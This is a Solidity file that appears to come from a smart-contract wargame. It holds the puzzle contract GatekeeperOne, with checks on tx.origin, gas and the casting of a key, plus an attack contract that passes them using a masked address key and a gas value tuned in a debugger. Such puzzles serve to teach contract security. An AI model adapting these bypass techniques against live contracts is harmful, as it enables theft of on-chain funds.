// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}

contract GateCracker {
    GatekeeperOne gateKeeper =
        GatekeeperOne(0x6525b39D6bB79Bd46906214f04c39609Cb631a37);

    function enter() public payable {
        bytes8 key = bytes8(
            uint64(uint160(0x6feA151248f89dbaA5c37b2Ab0135BbfF92bAC17)) 
        ) & 0xFFFFFFFF0000FFFF;
        gateKeeper.enter{gas: 10000 - 1386}(key); // 1386 was captured from debugger
    }
}
//0x6feA151248f89dbaA5c37b2Ab0135BbfF92bAC17